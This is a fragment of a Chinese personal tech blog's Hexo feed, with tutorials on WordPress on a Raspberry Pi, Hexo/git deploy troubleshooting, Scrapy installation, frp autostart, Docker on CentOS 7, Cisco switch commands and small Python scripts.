src="https://img-blog.csdnimg.cn/20191220211745805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="8-安装wordpress"><a href="#8-安装wordpress" class="headerlink" title="8.安装wordpress"></a>8.安装wordpress</h4><p>修改权限<br><code>sudo chmod 777 /var/www/html</code>    #我用的是root用户，所以不用这一步。<br><code>rm /var/www/html/index.html</code>         #删除默认自带的index.html文件</p><p>下载wordpress<br>到官网下载：<a href="https://wordpress.org/" target="_blank" rel="noopener">https://wordpress.org/</a>    最近官网总是访问不了，报错429。<br>这是一网上找的一个备用地址：<a href="http://cn.wp101.net/download/" target="_blank" rel="noopener">http://cn.wp101.net/download/</a>    我下载过没有发现问题。</p><p>下载好之后，解压：<code>tar zxf wordpress-5.3.2-zh_CN.tar.gz</code><br>将解压的wordpress文件移动到/var/www/html下</p><h4 id="9-配置wordpress"><a href="#9-配置wordpress" class="headerlink" title="9.配置wordpress"></a>9.配置wordpress</h4><p>电脑浏览器输入树莓派ip，会出现一些目录，点击选wordpress，自动跳出安装页面。<br><img src="https://img-blog.csdnimg.cn/20191220213744441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019122021384086.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击现在就开始。<br>数据库名就是刚才建立的wordpress<br>用户名和密码就是上面mysql设置的账号密码<br><img src="https://img-blog.csdnimg.cn/20191220214209959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>输入用户名密码后，点击提交<br><img src="https://img-blog.csdnimg.cn/20191220215203460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>到了这里先别急着点击现在安装,将上面的这些内容复制。</strong></p><p>回到树莓派终端上面<br>在/var/www/html/wordpress文件下创建一个wp-config.php<br>nano wp-config.php<br>将上面复制的内容复制进来，然后保存。</p><p><strong>保存后在回到刚刚那个网页上面点击现在安装。</strong></p><h4 id="10-填写基本信息"><a href="#10-填写基本信息" class="headerlink" title="10.填写基本信息"></a>10.填写基本信息</h4><p><img src="https://img-blog.csdnimg.cn/20191220220212535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>填写完之后，选择安装wordpress<br><img src="https://img-blog.csdnimg.cn/20191220220327189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在浏览器输入ip 地址/wordpress可以进入到博客<br>例如：<a href="http://192.168.1.179/wordpress/" target="_blank" rel="noopener">http://192.168.1.179/wordpress/</a><br><img src="https://img-blog.csdnimg.cn/20191220220758889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入192.168.1.179/wordpress/wp-admin/可以进入博客的后台进行管理<br><img src="https://img-blog.csdnimg.cn/20191220220936249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>好了，到这里我们就搭建完成了。接下来就是就是处理内网穿透的问题了，我前面写了centos7和ubuntu的内网穿透，由于树莓派的系统raspberrypi 跟这两个系统不一样，方法不适用，我先做一番测试再写个教程吧，上面这些步骤是我一步一步试过的，是可行的，如果有人按照上面的步骤出错的话，请仔细排除一下有没有哪步搞错了。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git上传博客不成功的故障排查</title>
      <link href="/2019/12/16/git%E4%B8%8A%E4%BC%A0%E5%8D%9A%E5%AE%A2%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/"/>
      <url>/2019/12/16/git%E4%B8%8A%E4%BC%A0%E5%8D%9A%E5%AE%A2%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="发现故障"><a href="#发现故障" class="headerlink" title="发现故障"></a>发现故障</h1><p>今天写了一篇博客，然后用git上传到github上，git终端上显示没有什么异常，过了一会，我到浏览器打开我的博客网站，发现没有看到刚刚上传的博客，一开始还以为是网络延迟呢，又过了一会我打开还是没有看到，我换了三个浏览器都没有看到，我清楚我要开始排除故障了。</p><a id="more"></a><h1 id="分析故障"><a href="#分析故障" class="headerlink" title="分析故障"></a>分析故障</h1><p><strong>分析故障的第一要素绝对是要看故障现象</strong><br>我重新查看了一遍自己的步骤<br>blog目录路径没错<br>hexo g   显示也没什么问题（一开始没有看仔细）<br>hexo d   显示已经上传成功的界面</p><p><strong>分析故障的第二要素就是看日志</strong><br>git log<br>提示：<br>fatal: not a git repository (or any of the parent directories): .git</p><p>我才发现我还没又创建 .git 文件<br>创建下 .git 文件，下次能用到<br>git init</p><p>看不了日志就从别的地方开始查</p><h1 id="查看故障"><a href="#查看故障" class="headerlink" title="查看故障"></a>查看故障</h1><p><strong>从终端git 到 GitHub 一路找过去</strong><br>在git上排除原因：<br>git config user.name   查看用户名有没有问题，结果正常<br>git config user.email    查看邮箱是否正确，结果正常<br>ssh -T <a href="mailto:git@github.com">git@github.com</a>   连接gGitHub也显示正常</p><p>在GitHub上找原因<br>我登录我github的仓库看看，发现没有今天的数据，只有15号的数据，也就是说git根本没有上传成功</p><h1 id="解决故障"><a href="#解决故障" class="headerlink" title="解决故障"></a>解决故障</h1><p><strong>重启git终端</strong><br>重启git终端之后，再次重新上传博客，这次发现报错了<br><img src="https://img-blog.csdnimg.cn/20191217214524275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示第五行出错了<br>我打开博客文件发现，date:2019-12-17 之间少了一个空格，添加空格之后发现执行 hexo g 正常了</p><p>我继续执行hexo d 之后又报错了<br><img src="https://img-blog.csdnimg.cn/20191217214827112.png" alt="在这里插入图片描述"><br>显示生成失败，这又是第一次遇到的故障，之前从来没有遇到过的，我的直觉告诉我，可能是我所处在的商业网络不稳定或者做了某方面的限制。<br>我尝试多次执行hexo d 指令还是报错。<br>无奈之下我开启了我的VPN，然后再次执行，就成功了。<br>刷新博客，已经正常显示了。<br>到最后我还是没有搞清楚是什么原因导致了上传不成功，网络做了限制了吗? 这个问题留给我以后解决。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>掷骰子决定做什么事情</title>
      <link href="/2019/12/16/%E6%8E%B7%E9%AA%B0%E5%AD%90%E5%86%B3%E5%AE%9A%E5%81%9A%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85/"/>
      <url>/2019/12/16/%E6%8E%B7%E9%AA%B0%E5%AD%90%E5%86%B3%E5%AE%9A%E5%81%9A%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85/</url>
      
        <content type="html"><![CDATA[<h1 id="掷骰（tou）子决定做什么事情"><a href="#掷骰（tou）子决定做什么事情" class="headerlink" title="掷骰（tou）子决定做什么事情"></a>掷骰（tou）子决定做什么事情</h1><p>最近在学python的时候看见一段有趣的代码，就是掷骰子决定做什么事情，顿时感觉这是个好东西，平时自己有时候学习久了就会发懵，一时间不知道自己该做什么了，有太多的东西想学了，反而会无从下手。有了这个游戏，我就可以掷骰子决定自己做什么事情。另外在生活上也能派上用场，比如和朋友玩时没决定好做什么的时候，就可以拿出来玩一下了。</p><a id="more"></a><pre><code>&quot;&quot;&quot;掷骰子决定做什么事情&quot;&quot;&quot;from random import randint# get random number 1-6face = randint(1, 6)print(face)if face == 1:    res = &#39;linux&#39;elif face == 2:    res = &#39;kali&#39;elif face == 3:    res = &#39;python&#39;elif face == 4:    res = &#39;take a walk&#39;elif face == 5:    res = &#39;exercise&#39;else:    res = &#39;play games&#39;print(&#39;play&#39; + res)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip install scrapy 命令安装scrapy显示错误</title>
      <link href="/2019/12/14/pip%20install%20scrapy%20%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85scrapy%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF/"/>
      <url>/2019/12/14/pip%20install%20scrapy%20%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85scrapy%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Python安装scrapy失败解决方法"><a href="#Python安装scrapy失败解决方法" class="headerlink" title="Python安装scrapy失败解决方法"></a>Python安装scrapy失败解决方法</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>Scrapy是Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动化测试。</p><a id="more"></a><p>安装 Scrapy 与安装其他 Python 包没有区别，同样使用如下命令来安装：<br>pip install scrapy<br>如果在命令行窗口中运行该命令，将会看到程序并不立即下载、安装 Scrapy，而是不断地下载大量第三方包。<br>如果在命令行窗口中提示找不到 pip 命令，则也可以通过 python 命令运行 pip 模块来安装 Scrapy，例如 python -m pip install scrapy</p><p>这是因为 Scrapy 需要依赖、大量第三方包。典型的，Scrapy 需要依赖如下第三方包：</p><p>   pyOpenSSL：Python 用于支持 SSL（Security Socket Layer）的包。<br>   cryptography：Python 用于加密的库。<br>   CFFI：Python 用于调用 C 的接口库。<br>   zope.interface：为 Python 缺少接口而提供扩展的库。<br>   lxml：一个处理 XML、HTML 文档的库，比 Python 内置的 xml 模块更好用。<br>   cssselect：Python 用于处理 CSS 选择器的扩展包。<br>   Twisted：为 Python 提供的基于事件驱动的网络引擎包。<br>    ……</p><p><code>python -m pip install scrapy</code> 命令安装scrapy显示错误<br>或者<code>pip install scrapy</code> 命令安装scrapy显示错误</p><p><a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted" target="_blank" rel="noopener">http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</a><br>去这个网址上下载twisted<br>cp后面是python版本，amd64代表64位<br>例如：Twisted-19.10.0-cp38-cp38-win_amd64.whl</p><p>下载到一个目录上后：<br>例如：D:\Software area</p><p>接下来要用管理员身份模式打开终端cmd或者powershell</p><p>powershell切换到D盘<br>cd d:<br>安装Twisted<br>PS D:\Software area&gt; python -m pip install .\Twisted-19.10.0-cp38-cp38-win_amd64.whl</p><p>cmd<br>切换到D盘<br>C:\Users\caiii&gt;d:<br>D:&gt;dir<br>安装Twisted<br>D:\Software area&gt;python -m pip install .\Twisted-19.10.0-cp38-cp38-win_amd64.whl </p><p>安装完Twisted后</p><p>再次安装<br>python -m pip install scrapy 或者 pip install scrapy<br>就会显示成功安装了</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统设置frp开机自动启动</title>
      <link href="/2019/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AEfrp%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
      <url>/2019/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AEfrp%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>之前写过一篇关于搭建frp服务的文章，里面采用的后台启动方式有一个很大的弊端，就是系统重启之后，frp的服务就要手动开启一次才能正常运行，这实在是不能忍的，现在都什么年代了，现在都流行自动化了，所以必须要让frp开机启动。本文只讲ubuntu系统和centos系统，这两个系统使用率较高，windows系统的还没实践过就先不讲。</p><a id="more"></a><h3 id="ubuntu系统下："><a href="#ubuntu系统下：" class="headerlink" title="ubuntu系统下："></a>ubuntu系统下：</h3><p>第一步：下载安装Ubuntu下常用的进程管理器supervisor：</p><pre><code>sudo apt install supervisor -y</code></pre><p>第二步：在/etc/supervisor/conf.d下新建一个配置文件frp.conf。输入以下内容。command 是放置frp的位置。</p><pre><code>vim /etc/supervisor/conf.d/frp.conf</code></pre><p>客户端：</p><pre><code>[program:frp]command = /etc/frp/frpc -c /etc/frp/frpc.iniautostart = true</code></pre><p>服务端：</p><pre><code>[program:frp]command = /etc/frp/frps -c /etc/frp/frps.iniautostart = true</code></pre><p>重启supervisor</p><pre><code>sudo systemctl restart supervisor</code></pre><p>查看运行状态：</p><pre><code>sudo systemctl status supervisor</code></pre><p>查看frp服务是否已经启动</p><pre><code>ps -ef | grep frp</code></pre><p>最后设置supervisor开机启动</p><pre><code>sudo systemctl enable supervisor</code></pre><h3 id="centos7系统下"><a href="#centos7系统下" class="headerlink" title="centos7系统下"></a>centos7系统下</h3><p>例如：frp的文件路径是/etc/frp/下</p><p>客户端：<br>第一步：<br><code>cp /etc/frp/frpc /usr/local/bin/frpc</code><br>第二步：<br><code>vim /lib/systemd/system/frpc.service</code><br>填入一下内容：</p><pre><code>[Unit]Description=frpc serviceAfter=network.target syslog.targetWants=network.target[Service]Type=simpleExecStart=/etc/frp/frpc -c /etc/frp/frpc.ini[Install]WantedBy=multi-user.target</code></pre><p>保存退出</p><pre><code>systemctl daemon-reloadsystemctl start frpc        #启动frpcsystemctl status frpc     #查看状态systemctl enable frpc     #设置开机启动</code></pre><p>服务端：<br>第一步：<br><code>cp /etc/frp/frps /usr/local/bin/frps</code><br>第二步：<br><code>vim /lib/systemd/system/frps.service</code><br>填入一下内容：</p><pre><code>[Unit]Description=frps serviceAfter=network.target syslog.targetWants=network.target[Service]Type=simpleExecStart=/etc/frp/frps -c / etc/frp/frps.ini[Install]WantedBy=multi-user.target</code></pre><p>保存退出</p><pre><code>systemctl start frps        #启动frpssystemctl status frps     #查看状态systemctl enable frps    #设置开机启动</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用python画一朵玫瑰花</title>
      <link href="/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/"/>
      <url>/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/</url>
      
        <content type="html"><![CDATA[<p>这是我按照网上的教程写出来的，做了细节上的修改。这是我经手的第一朵花，放上我的博客做个纪念。</p><a id="more"></a><pre><code>## 代码如下：import turtleturtle.speed(15)turtle.screensize(400, 300, &quot;pink&quot;)turtle.goto(-200, 0)turtle.setup(1000, 600)turtle.write(&#39;赠：亲爱的           &#39;, move=True, align=&#39;left&#39;, font=(&#39;楷体&#39;, 16, &#39;normal&#39;))# 设置初始位置turtle.pensize(2)turtle.penup()turtle.left(90)turtle.forward(200)turtle.pendown()turtle.right(90)# 花蕊turtle.fillcolor(&quot;red&quot;)turtle.begin_fill()turtle.circle(10, 180)turtle.circle(25, 110)turtle.left(50)turtle.circle(60, 45)turtle.circle(20, 170)turtle.right(24)turtle.fd(30)turtle.left(10)turtle.circle(30, 110)turtle.fd(20)turtle.left(40)turtle.circle(90, 70)turtle.circle(30, 150)turtle.right(30)turtle.fd(15)turtle.circle(80, 90)turtle.left(15)turtle.fd(45)turtle.right(165)turtle.fd(20)turtle.left(155)turtle.circle(150, 80)turtle.left(50)turtle.circle(150, 90)turtle.end_fill()# 花瓣1turtle.left(150)turtle.circle(-90, 70)turtle.left(20)turtle.circle(75, 105)turtle.setheading(60)turtle.circle(80, 98)turtle.circle(-90, 40)# 花瓣2turtle.left(180)turtle.circle(90, 40)turtle.circle(-80, 98)turtle.setheading(-83)# 叶子1turtle.pensize(10)turtle.fd(30)turtle.pensize(2)turtle.left(90)turtle.fd(25)turtle.left(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(-80, 90)turtle.right(90)turtle.circle(-80, 90)turtle.end_fill()turtle.right(135)turtle.fd(100)turtle.fd(-50)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.right(35)turtle.fd(-10)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.right(145)turtle.fd(65)turtle.pensize(10)turtle.left(90)turtle.fd(80)# 叶子2turtle.pensize(2)turtle.right(90)turtle.right(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(80, 90)turtle.left(90)turtle.circle(80, 90)turtle.end_fill()turtle.left(135)turtle.fd(100)turtle.fd(-40)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.left(35)turtle.fd(-20)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.left(145)turtle.fd(40)turtle.right(90)turtle.pensize(10)turtle.circle(300, 60)turtle.hideturtle()turtle.done()exit()</code></pre><h2 id="附上我的效果图"><a href="#附上我的效果图" class="headerlink" title="附上我的效果图"></a>附上我的效果图</h2><p><img src="https://img-blog.csdnimg.cn/20191213002843928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7安装docker</title>
      <link href="/2019/12/08/centos7%E5%AE%89%E8%A3%85docker/"/>
      <url>/2019/12/08/centos7%E5%AE%89%E8%A3%85docker/</url>
      
        <content type="html"><![CDATA[<h3 id="检查是否安装过-docker-："><a href="#检查是否安装过-docker-：" class="headerlink" title="检查是否安装过 docker ："></a>检查是否安装过 docker ：</h3><pre><code class="vim">yum list installed | grep docker</code></pre><p>如果有安装了，如果重新安装需要先卸载：<br>使用命令 <code>yum -y remove docker-ce.x86_64</code>  卸载</p><p>删除存储目录：</p><pre><code class="vala"># rm -rf /etc/docker# rm -rf /run/docker# rm -rf /var/lib/dockershim# rm -rf /var/lib/docker</code></pre><a id="more"></a><h3 id="开始安装："><a href="#开始安装：" class="headerlink" title="开始安装："></a>开始安装：</h3><p>使用命令 uname-r 检查centOs的内核版本 docker要求centOs的内核版本在3.10 以上</p><p>安装必要的系统工具：</p><pre><code class="haskell">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</code></pre><p>添加软件源信息 ：</p><pre><code class="vim">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></pre><p> 更新yum 缓存：</p><pre><code class="ebnf"> sudo yum makecache fast </code></pre><p>安装docker-ce ：</p><pre><code class="ebnf">sudo yum -y install docker-ce</code></pre><p>启动 docker 后台服务 ：</p><pre><code class="ebnf">sudo systemctl start docker</code></pre><p>设置开机启动docker服务：</p><pre><code class="bash">sudo systemctl enable docker</code></pre><p>运行hello-world 镜像：</p><pre><code class="dockerfile">docker run hello-world</code></pre><p>看到Hello from Docker! 字样说明已经安装成功。</p><p>一些常用的指令：<br><code>docker version</code>    查看版本<br><code>docker info</code>      查看基本信息</p><h3 id="接下来安装镜像"><a href="#接下来安装镜像" class="headerlink" title="接下来安装镜像"></a>接下来安装镜像</h3><p>查看一下镜像列表</p><pre><code class="stata">docker search centos</code></pre><p>下载centos镜像</p><pre><code class="ebnf">docker pull centos</code></pre><p>查看镜像列表</p><pre><code class="ebnf">docker images</code></pre><p>运行centos镜像</p><pre><code class="groovy">docker run -it centos:latest /bin/bash</code></pre><p>参数解释：<br>run ： 运行<br>-i   ：以交互模式运行容器，通常与 -t 同时使用<br>-t  ： 为容器重新分配一个伪输入终端，通常与 -i 同时使用<br>latest  ： 镜像版本<br>/bin/bash  ： 镜像的终端</p><p><strong>告警：IPv4 forwarding is disabled. Networking will not work.<br>解决：开启网络转发功能<br>方法1：<br>cat /proc/sys/net/ipv4/ip_forward  查看是否为1<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br>方法2：<br>vim /etc/sysctl.conf<br>添加<br>net.ipv4.ip_forward = 1<br>保存退出后查看：<br>sysctl -p<br>cat /proc/sys/net/ipv4/ip_forward</strong></p><pre><code class="elixir">[root@localhost ~]# docker run -it centos:latest /bin/bash[root@df8906f5a898 /]#</code></pre><p>说明已成功运行了。</p><p>查看下系统版本：</p><pre><code class="lsl">[root@42f11d0175a3 /]# cat /etc/redhat-release CentOS Linux release 8.0.1905 (Core)</code></pre><p>退出系统用exit</p><p>示例：在container中启动一个长久运行的进程，不断向stdin输出hello world。模拟一个后台运行的服务。</p><pre><code class="dockerfile">docker run -d centos:latest /bin/bash -c &quot;while true; do echo hello world; sleep 1; done&quot;</code></pre><p>参数：<br>-d  后台运行容器，并返回容器ID；<br>-c  后面跟待完成的命令。</p><p>从容器中查看日志，查看输出的内容<br>语法： docker logs 容器name/ID</p><pre><code class="dns">docker logs 69bec6b3d840</code></pre><p>查看容器ID<br><code>docker ps</code>    列出所有运行中的容器<br><code>docker ps -a</code>   查看所有容器</p><p>结束运行的容器进程</p><pre><code class="sql">docker psdocker kill IDdocker kill 69bec6b3d840</code></pre><p>启动、停止、重启 容器进程：</p><pre><code class="sql">docker start IDdocker stop IDdocker restart ID</code></pre><p>删除容器：（容器关闭的前提下）</p><pre><code class="stata">docker rm ID</code></pre><p>强制删除：</p><pre><code class="bash">docker rm -f ID</code></pre><h3 id="docker镜像制作方法"><a href="#docker镜像制作方法" class="headerlink" title="docker镜像制作方法"></a>docker镜像制作方法</h3><p>两种方法：<br>方法1：docker commit   # 保存container的当前状态到image后，然后生成对应的image。<br>方法2：docker build   # 使用dockerfile文件自动化制作image。</p><p>方法1示例：制作一个apache的镜像</p><pre><code class="awk">docker run -it centos:latest /bin/bashyum install -y httpdexitdocker ps -a[root@localhost ~]# docker commit 2c9ae8cf8ba6 centos:apache   命名为centos：apache</code></pre><p>查看下是否保存成功：</p><pre><code class="lsl">[root@localhost ~]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEcentos              apache              9017e4f2adb4        15 seconds ago      269MBcentos              latest              0f3e07c0138f        2 months ago        220MBhello-world         latest              fce289e99eb9        11 months ago       1.84kB</code></pre><p>删除镜像：<br><code>docker rmi centos:latest</code><br>或者 <code>docker rmi 0f3e07c0138f</code></p><h3 id="docker-image-的发布"><a href="#docker-image-的发布" class="headerlink" title="docker image 的发布"></a>docker image 的发布</h3><p>方法1：save image to tarball<br>保存image到tar包<br>语法：docker save -o 导出的镜像名.tar  本地镜像名：镜像标签</p><pre><code class="css">[root@localhost ~]# docker save -o docker-centos-latest.tar centos:latest</code></pre><p>方法2： push image to docker hub<br>1.signup on docker hub &amp; create repo    注册一个账号<br><a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a><br>2.login to docker hub</p><pre><code class="shell"># docker login -u 用户名 -p 密码 -e 123456789@qq.com</code></pre><p>3.push image to docker hub   # 上传镜像</p><pre><code class="css">#docker push centos:latest</code></pre><p>4.pull image from docker hub   # 下载镜像</p><pre><code class="vala">#docker pull 用户名/镜像名：镜像标签</code></pre><h3 id="导入本地镜像"><a href="#导入本地镜像" class="headerlink" title="导入本地镜像"></a>导入本地镜像</h3><pre><code class="stylus">docker load -i docker-centos-latest.tar</code></pre><h3 id="container-容器端口映射"><a href="#container-容器端口映射" class="headerlink" title="container 容器端口映射"></a>container 容器端口映射</h3><pre><code>[root@localhost ~]# netstat -tunlpdocker run -it -d --name my-httpd -p 8088:80 centos:apache[root@localhost ~]# netstat -tunlp</code></pre><p>访问已经运行的容器：</p><pre><code>docker psdocker  exec -it 0f3e07c0138f /bin/bash</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科交换机常用指令（持续更新）</title>
      <link href="/2019/11/18/%E6%80%9D%E7%A7%91%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
      <url>/2019/11/18/%E6%80%9D%E7%A7%91%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="思科交换机常用指令"><a href="#思科交换机常用指令" class="headerlink" title="思科交换机常用指令"></a>思科交换机常用指令</h3><h4 id="vlan设置"><a href="#vlan设置" class="headerlink" title="vlan设置"></a>vlan设置</h4><pre><code>console&gt;enable    //进入特权模式console#configure      //进入配置视图console(config)#vlan database     //进入vlan配置console(config-vlan)#vlan 2   //创建vlan2console(config-vlan)#no vlan 2      //删除vlan 2console(config-vlan)#exit    //退回到特权模式下console(config)#interface vlan 2      //进入vlan2的配置视图console(config-if-vlan2)#name xxx    //为vlan2修改名字</code></pre><h4 id="端口配置"><a href="#端口配置" class="headerlink" title="端口配置"></a>端口配置</h4><a id="more"></a><pre><code> console(config)#interface ethernet 1/g1    //进入网口1，/1/g1指的是第一个插槽上的第一个千兆网口console(config-if-1/g1)#     //接口视图模式console(config-if-1/g1)# speed 10/100/1000      //定义端口的带宽，只能从这三种模式中做选择。console(config-if-1/g1)# duplex full/half     //定义双工模式console(config-if-1/g1)# negotiation    //启用自动协商速度和双工参数console(config-if-1/g1)# no negotiation  //禁用自动协商速度和双工参数console(config-if-1/g1)# switchport mode access/trunk/general       //定义端口类型，总共有三种类型console(config-if-1/g1)# switchport access vlan 2     //将端口以access模式加入到vlan 2 中console(config-if-1/g1)# shutdown     //关闭当前端口console(config-if-1/g1)# no shutdown       //打开当前端口console(config)#interface   ethernet 1/g24        //进入汇聚千兆口24，共有四个千兆combo口21-24console(config-if-1/g24)#      //接口视图模式console(config-if-1/g24)#duplex  auto/full/half      //设置端口工作模式为 自适应/全双通/半双通console(config-if-1/g24)#switchport mode trunk      //设置当前端口模式为汇聚口console(config-if-1/g24)#switchport mode access    //设置当前端口模式为接入模式console(config-if-1/g24)#switchport trunk allowed vlan add/remove 1,2     //将当前汇聚端口加入或移除从vlan 1 ，2通过，vlan修剪，默认为all，全部允许console(config-if-1/g24)#switchport access vlan 2    //将当前端口以access模式加入到vlan2 中若21-24号口用作光口的话，配置接口就对应1/xg1-1/xg4代表使用光纤做10G上联口用：console(config)#interface ethernet 1/xg1       //进入汇聚万兆口1，共有4个千兆combo口21-24对应四个1/xg1-1/xg4万兆光口console(config-if-1/xg1)#console(config-if-1/xg1)#duplex auto/full/half      //设置端口工作模式为  自适应/全双通/半双通console(config-if-1/xg1)#switchport mode trunk   //设置当前端口模式为汇聚口console(config-if-1/xg1)#switchport mode access  //设置当前端口模式为接入模式console(config-if-1/xg1)#switchport trunk allowed vlan add/remove  1,2    //将当前汇聚端口加入或移除从vlan1，2通过，vlan修剪，默认为all，全部允许console(config-if-1/xg1)#switchport access vlan 2  //将当前端口以access模式加入vlan2中</code></pre><h4 id="将单个端口加入vlan"><a href="#将单个端口加入vlan" class="headerlink" title="将单个端口加入vlan"></a>将单个端口加入vlan</h4><pre><code>console(config)#interface ethernet 1/g1console(config-if-1/g1)#switchport mode access console(config-if-1/g1)#switchport access vlan 2</code></pre><h4 id="将多个端口加入到vlan中"><a href="#将多个端口加入到vlan中" class="headerlink" title="将多个端口加入到vlan中"></a>将多个端口加入到vlan中</h4><pre><code>console(config)#interface range ethernet 1/g1-1/g12     //进入1-12这个接口组里配置console(config-if)#switchport mode accessconsole(config-if)#switchport access vlan 2console#show vlan    //用于查看配置后结果</code></pre><p>设置VTP<br>cisco专有的vlan终级协议也成为局域网干道协议，作用是十几台交换机在企业网中，配置vlan工作量大，可以使用VTP协议，把一台交换机配置成VTP server，其余交换机配置成VTP 